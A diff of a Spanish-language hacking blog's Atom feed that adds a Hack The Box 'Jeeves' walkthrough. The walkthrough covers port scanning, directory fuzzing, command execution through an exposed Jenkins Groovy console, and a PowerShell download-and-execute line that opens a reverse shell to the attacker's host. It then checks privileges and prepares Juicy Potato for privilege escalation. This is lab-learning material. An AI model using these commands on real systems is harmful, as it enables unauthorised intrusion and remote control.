@@ -1,4 +1,559 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.8.5">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2021-10-09T00:33:31-05:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">K4miyo | Ciberseguridad!</title><subtitle>Artículos relacinados al hacking ético en diferentes plataformas</subtitle><author><name>K4miyo</name></author><entry><title type="html">Hack The Box Bastard</title><link href="http://localhost:4000/htb-bastard/" rel="alternate" type="text/html" title="Hack The Box Bastard" /><published>2021-10-09T00:00:00-05:00</published><updated>2021-10-09T00:00:00-05:00</updated><id>http://localhost:4000/htb-bastard</id><content type="html" xml:base="http://localhost:4000/htb-bastard/">&lt;p&gt;&lt;img src=&quot;/assets/images/htb-bastard/banner-bastard.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.8.5">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2021-10-11T16:05:25-05:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">K4miyo | Ciberseguridad!</title><subtitle>Artículos relacinados al hacking ético en diferentes plataformas</subtitle><author><name>K4miyo</name></author><entry><title type="html">Hack The Box Jeeves</title><link href="http://localhost:4000/htb-jeeves/" rel="alternate" type="text/html" title="Hack The Box Jeeves" /><published>2021-10-11T00:00:00-05:00</published><updated>2021-10-11T00:00:00-05:00</updated><id>http://localhost:4000/htb-jeeves</id><content type="html" xml:base="http://localhost:4000/htb-jeeves/">&lt;p&gt;&lt;img src=&quot;/assets/images/htb-jeeves/banner-jeeves.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;jeeves&quot;&gt;Jeeves&lt;/h2&gt;
+&lt;p&gt;Se procede con la fase de reconocimiento lanzando primeramente un &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ping&lt;/code&gt; a la dirección IP 10.10.10.63.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ ping &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; 1 10.10.10.63
+PING 10.10.10.63 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;10.10.10.63&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; 56&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;84&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; bytes of data.
+64 bytes from 10.10.10.63: &lt;span class=&quot;nv&quot;&gt;icmp_seq&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1 &lt;span class=&quot;nv&quot;&gt;ttl&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;127 &lt;span class=&quot;nb&quot;&gt;time&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;136 ms
+
+&lt;span class=&quot;nt&quot;&gt;---&lt;/span&gt; 10.10.10.63 ping statistics &lt;span class=&quot;nt&quot;&gt;---&lt;/span&gt;
+1 packets transmitted, 1 received, 0% packet loss, &lt;span class=&quot;nb&quot;&gt;time &lt;/span&gt;0ms
+rtt min/avg/max/mdev &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 136.230/136.230/136.230/0.000 ms
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;De acuerdo con el TTL de traza ICMP, se puede determinar que se trata de una máquina con sistema operativo Windows. A continuación se procede con la ejecución de &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nmap&lt;/code&gt; para determinar los puertos abiertos de la máquina y exportanto la información al archivo &lt;strong&gt;allPorts&lt;/strong&gt;.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ nmap &lt;span class=&quot;nt&quot;&gt;-p-&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--open&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--min-rate&lt;/span&gt; 5000 &lt;span class=&quot;nt&quot;&gt;-vvv&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-n&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-Pn&lt;/span&gt; 10.10.10.63 &lt;span class=&quot;nt&quot;&gt;-oG&lt;/span&gt; allPorts
+Host discovery disabled &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-Pn&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt; All addresses will be marked &lt;span class=&quot;s1&quot;&gt;'up'&lt;/span&gt; and scan &lt;span class=&quot;nb&quot;&gt;times &lt;/span&gt;may be slower.
+Starting Nmap 7.92 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt; https://nmap.org &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; at 2021-10-09 00:42 CDT
+Initiating SYN Stealth Scan at 00:42
+Scanning 10.10.10.63 &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;65535 ports]
+Discovered open port 445/tcp on 10.10.10.63
+Discovered open port 80/tcp on 10.10.10.63
+Discovered open port 135/tcp on 10.10.10.63
+Discovered open port 50000/tcp on 10.10.10.63
+Completed SYN Stealth Scan at 00:42, 26.41s elapsed &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;65535 total ports&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+Nmap scan report &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;10.10.10.63
+Host is up, received user-set &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0.14s latency&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
+Scanned at 2021-10-09 00:42:20 CDT &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;27s
+Not shown: 65531 filtered tcp ports &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;no-response&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+Some closed ports may be reported as filtered due to &lt;span class=&quot;nt&quot;&gt;--defeat-rst-ratelimit&lt;/span&gt;
+PORT      STATE SERVICE      REASON
+80/tcp    open  http         syn-ack ttl 127
+135/tcp   open  msrpc        syn-ack ttl 127
+445/tcp   open  microsoft-ds syn-ack ttl 127
+50000/tcp open  ibm-db2      syn-ack ttl 127
+
+Read data files from: /usr/bin/../share/nmap
+Nmap &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;: 1 IP address &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1 host up&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; scanned &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;26.49 seconds
+           Raw packets sent: 131084 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;5.768MB&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; | Rcvd: 22 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;968B&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Mediante la función &lt;a href=&quot;/extractPorts&quot;&gt;extractPorts&lt;/a&gt; definida a nivel de &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;zsh&lt;/code&gt; , se obtiene la información más relevante de la captura grepeable.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ extractPorts allPorts
+───────┬───────────────────────────────────────
+       │ File: extractPorts.tmp
+───────┼───────────────────────────────────────
+   1   │ 
+   2   │ &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Extracting information...
+   3   │ 
+   4   │     &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; IP Address: 10.10.10.63
+   5   │     &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Open ports: 80,135,445,50000
+   6   │ 
+   7   │ &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Ports copied to clipboard
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;A continuación se lanza una serie de scripts para determinar el servicio y versión que corren para los puertos detectados.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ nmap &lt;span class=&quot;nt&quot;&gt;-sC&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-sV&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-p80&lt;/span&gt;,135,445,50000 10.10.10.63 &lt;span class=&quot;nt&quot;&gt;-oN&lt;/span&gt; targeted
+Starting Nmap 7.92 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt; https://nmap.org &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; at 2021-10-09 00:43 CDT
+Nmap scan report &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;10.10.10.63
+Host is up &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0.14s latency&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
+
+PORT      STATE SERVICE      VERSION
+80/tcp    open  http         Microsoft IIS httpd 10.0
+|_http-title: Ask Jeeves
+|_http-server-header: Microsoft-IIS/10.0
+| http-methods: 
+|_  Potentially risky methods: TRACE
+135/tcp   open  msrpc        Microsoft Windows RPC
+445/tcp   open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;workgroup: WORKGROUP&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+50000/tcp open  http         Jetty 9.4.z-SNAPSHOT
+|_http-title: Error 404 Not Found
+|_http-server-header: Jetty&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;9.4.z-SNAPSHOT&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+Service Info: Host: JEEVES&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; OS: Windows&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+|_clock-skew: mean: 5h04m47s, deviation: 0s, median: 5h04m47s
+| smb2-time: 
+|   &lt;span class=&quot;nb&quot;&gt;date&lt;/span&gt;: 2021-10-09T10:48:46
+|_  start_date: 2021-10-09T10:44:41
+| smb-security-mode: 
+|   authentication_level: user
+|   challenge_response: supported
+|_  message_signing: disabled &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;dangerous, but default&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+| smb2-security-mode: 
+|   3.1.1: 
+|_    Message signing enabled but not required
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
+Nmap &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;: 1 IP address &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1 host up&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; scanned &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;50.18 seconds
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Observamos que se encuentra abierto el puerto 445 asociado al servicio de SMB, por lo que podríamos probar si podemos listar recursos del sistema:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ smbclient &lt;span class=&quot;nt&quot;&gt;-L&lt;/span&gt; 10.10.10.63 &lt;span class=&quot;nt&quot;&gt;-N&lt;/span&gt;
+session setup failed: NT_STATUS_ACCESS_DENIED
+❯ smbmap &lt;span class=&quot;nt&quot;&gt;-H&lt;/span&gt; 10.10.10.63
+&lt;span class=&quot;o&quot;&gt;[!]&lt;/span&gt; Authentication error on 10.10.10.63
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;No tenemos permisos para ver recursos. Ahora vemos que tenemos servicios HTTP corriendo a través de los puertos 80 y 50000, así que vamos a checarlos:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ whatweb http://10.10.10.63/
+http://10.10.10.63/ &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;200 OK] Country[RESERVED][ZZ], HTML5, HTTPServer[Microsoft-IIS/10.0], IP[10.10.10.63], Microsoft-IIS[10.0], Title[Ask Jeeves]
+❯ whatweb http://10.10.10.63:50000/
+http://10.10.10.63:50000/ &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;404 Not Found] Country[RESERVED][ZZ], HTTPServer[Jetty&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;9.4.z-SNAPSHOT&lt;span class=&quot;o&quot;&gt;)]&lt;/span&gt;, IP[10.10.10.63], Jetty[9.4.z-SNAPSHOT], PoweredBy[Jetty://], Title[Error 404 Not Found]
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Vemos el uso de &lt;em&gt;Microsoft IIS 10.0&lt;/em&gt; a través del puerto 80 y un código de estado 404 para el puerto 50000.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/htb-jeeves/jeeves-web.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/htb-jeeves/jeeves-web1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Como no vemos nada interesante, vamos a buscar recursos en los sitios web. Vamos a empezar por el puerto 50000 debido a que es un puerto muy alto con el servicio HTTP:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ wfuzz &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-t&lt;/span&gt; 500 &lt;span class=&quot;nt&quot;&gt;--hc&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;404 &lt;span class=&quot;nt&quot;&gt;-w&lt;/span&gt; /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://10.10.10.63:50000/FUZZ
+ /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work co
+rrectly when fuzzing SSL sites. Check Wfuzz&lt;span class=&quot;s1&quot;&gt;'s documentation for more information.
+********************************************************
+* Wfuzz 3.1.0 - The Web Fuzzer                         *
+********************************************************
+
+Target: http://10.10.10.63:50000/FUZZ                                                                                            
+Total requests: 220560                                                                                                           
+                                                                                                                                 
+=====================================================================
+ID           Response   Lines    Word       Chars       Payload                                                         
+=====================================================================                         
+
+000041607:   302        0 L      0 W        0 Ch        &quot;askjeeves&quot;                                                     
+^C /usr/lib/python3/dist-packages/wfuzz/wfuzz.py:80: UserWarning:Finishing pending requests...
+                                
+Total time: 0   
+Processed Requests: 74106
+Filtered Requests: 74105                                        
+Requests/sec.: 0
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Tenemos el recurso &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;askjeeves&lt;/code&gt;, así que vamos a echarle un ojo:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/htb-jeeves/jeeves-askjeeves.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Vemos el uso de la herramienta &lt;strong&gt;Jenkins&lt;/strong&gt;, así que vamos a buscar un posible exploit asociado a dicha tecnología y especificamente, un exploit que nos permita ejecución de comandos:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ searchsploit jenkins &lt;span class=&quot;nb&quot;&gt;command &lt;/span&gt;execution
+&lt;span class=&quot;nt&quot;&gt;-----------------------------------------------------------------------------------------------&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;---------------------------------&lt;/span&gt;
+ Exploit Title                                                                                 |  Path
+&lt;span class=&quot;nt&quot;&gt;-----------------------------------------------------------------------------------------------&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;---------------------------------&lt;/span&gt;
+Jenkins 2.150.2 - Remote Command Execution &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Metasploit&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;                                        | linux/webapps/46352.rb
+Jenkins CI Script Console - Command Execution &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Metasploit&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;                                     | multiple/remote/24206.rb
+&lt;span class=&quot;nt&quot;&gt;-----------------------------------------------------------------------------------------------&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;---------------------------------&lt;/span&gt;
+Shellcodes: No Results
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;De los resultados observados, vamos a echarle un ojo al archivo &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;multiple/remote/24206.rb&lt;/code&gt; para ver que realiza. Tenemos que se debe de tener un recurso denominado &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;script&lt;/code&gt; en donde posiblemente podemos ejecutar comandos a nivel de sistema; por lo que vamos a ver.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/htb-jeeves/jeeves-groovy.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Investigando un poco sobre &lt;strong&gt;&lt;em&gt;Groovy script&lt;/em&gt;&lt;/strong&gt;, identificamos dos recursos que nos indican como podríamos ejecutar comandos a nivel de sistema y nos podria ayudar:&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;&lt;a href=&quot;https://onekilo79.wordpress.com/2016/03/31/jenkins-console-script-with-power/&quot;&gt;onekilo79.wordpress.com&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;https://groovy-lang.gitlab.io/101-scripts/basico/command_local-en.html&quot;&gt;groovy-lang.gitlab.io&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;Por lo el ejecutar los siguiente ya tenemos ejecución de comando a nivel de sistema:&lt;/p&gt;
+
+&lt;div class=&quot;language-groovy highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;cmd&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;whoami&quot;&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;cmd&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;execute&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;().&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;text&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/htb-jeeves/jeeves-cmd.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Ahora debemos ingresar al sistema, por lo que buscamos el archivo &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Invoke-PowerShellTcp&lt;/code&gt; en nuestra máquina y lo copiamos a nuestro directorio de trabajo&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ locate Invoke-PowerShellTcp
+/usr/share/nishang/Shells/Invoke-PowerShellTcp.ps1
+/usr/share/nishang/Shells/Invoke-PowerShellTcpOneLine.ps1
+/usr/share/nishang/Shells/Invoke-PowerShellTcpOneLineBind.ps1
+❯ &lt;span class=&quot;nb&quot;&gt;cp&lt;/span&gt; /usr/share/nishang/Shells/Invoke-PowerShellTcp.ps1 PS.ps1
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Y agregamos al final del archivo la siguiente linea&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Invoke-PowerShellTcp &lt;span class=&quot;nt&quot;&gt;-Reverse&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-IPAddress&lt;/span&gt; 10.10.14.17 &lt;span class=&quot;nt&quot;&gt;-Port&lt;/span&gt; 443
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Nos compartimos un servidor HTTP con python, nos ponemos en escucha a través del puerto 443 y nos entablamos una reverse shell:&lt;/p&gt;
+
+&lt;div class=&quot;language-groovy highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;cmd&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;C:\\Windows\\SysNative\\WindowsPowershell\\v1.0\\powershell.exe IEX(New-Object Net.WebClient).downloadString('http://10.10.14.17/PS.ps1')&quot;&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;cmd&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;execute&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;().&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;text&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ python3 &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; http.server 80
+Serving HTTP on 0.0.0.0 port 80 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;http://0.0.0.0:80/&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; ...
+10.10.10.63 - - &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;10/Oct/2021 13:54:25] &lt;span class=&quot;s2&quot;&gt;&quot;GET /PS.ps1 HTTP/1.1&quot;&lt;/span&gt; 200 -
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ rlwrap nc &lt;span class=&quot;nt&quot;&gt;-nlvp&lt;/span&gt; 443
+listening on &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;any] 443 ...
+connect to &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;10.10.14.17] from &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;UNKNOWN&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;10.10.10.63] 49678
+Windows PowerShell running as user kohsuke on JEEVES
+Copyright &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;C&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; 2015 Microsoft Corporation. All rights reserved.
+
+&lt;span class=&quot;nb&quot;&gt;whoami
+&lt;/span&gt;jeeves&lt;span class=&quot;se&quot;&gt;\k&lt;/span&gt;ohsuke
+PS C:&lt;span class=&quot;se&quot;&gt;\U&lt;/span&gt;sers&lt;span class=&quot;se&quot;&gt;\A&lt;/span&gt;dministrator&lt;span class=&quot;se&quot;&gt;\.&lt;/span&gt;jenkins&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Ya nos encontramos dentro de la máquina como el usuario &lt;strong&gt;kohsuke&lt;/strong&gt; y podemos visualizar la flag (user.txt).  Como utilizamos la ruta nativa de powershell, deberíamos tenermos un proceso igual que la architectura del sistema; esto lo podemos probar con los siguientes comandos:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;PS C:&lt;span class=&quot;se&quot;&gt;\U&lt;/span&gt;sers&lt;span class=&quot;se&quot;&gt;\A&lt;/span&gt;dministrator&lt;span class=&quot;se&quot;&gt;\.&lt;/span&gt;jenkins&amp;gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Environment]::Is64BitOperatingSystem
+True
+PS C:&lt;span class=&quot;se&quot;&gt;\U&lt;/span&gt;sers&lt;span class=&quot;se&quot;&gt;\A&lt;/span&gt;dministrator&lt;span class=&quot;se&quot;&gt;\.&lt;/span&gt;jenkins&amp;gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Environment]::Is64BitProcess
+True
+PS C:&lt;span class=&quot;se&quot;&gt;\U&lt;/span&gt;sers&lt;span class=&quot;se&quot;&gt;\A&lt;/span&gt;dministrator&lt;span class=&quot;se&quot;&gt;\.&lt;/span&gt;jenkins&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;En este punto nos queda escalar privilegios, así que vamos a enumerar un poco el sistema:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;whoami&lt;/span&gt; /priv
+
+PRIVILEGES INFORMATION
+&lt;span class=&quot;nt&quot;&gt;----------------------&lt;/span&gt;
+
+Privilege Name                Description                               State   
+&lt;span class=&quot;o&quot;&gt;=============================&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=========================================&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;========&lt;/span&gt;
+SeShutdownPrivilege           Shut down the system                      Disabled
+SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
+SeUndockPrivilege             Remove computer from docking station      Disabled
+SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
+SeCreateGlobalPrivilege       Create global objects                     Enabled 
+SeIncreaseWorkingSetPrivilege Increase a process working &lt;span class=&quot;nb&quot;&gt;set            &lt;/span&gt;Disabled
+SeTimeZonePrivilege           Change the &lt;span class=&quot;nb&quot;&gt;time &lt;/span&gt;zone                      Disabled
+PS C:&lt;span class=&quot;se&quot;&gt;\U&lt;/span&gt;sers&lt;span class=&quot;se&quot;&gt;\A&lt;/span&gt;dministrator&lt;span class=&quot;se&quot;&gt;\.&lt;/span&gt;jenkins&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Vemos que tenemos el permiso &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SeImpersonatePrivilege&lt;/code&gt; habilitado, por lo que ya debemos estar pensando en &lt;strong&gt;Juicy Potato&lt;/strong&gt;; asi que nos lo descargamos:&lt;/p&gt;
+
+&lt;p&gt;&lt;a href=&quot;https://github.com/ohpe/juicy-potato/releases&quot;&gt;Juicy Potato&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;Y lo pasamos a nuestro directorio de trabajo:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ &lt;span class=&quot;nb&quot;&gt;cp&lt;/span&gt; /home/k4miyo/Descargas/Firefox/JuicyPotato.exe &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
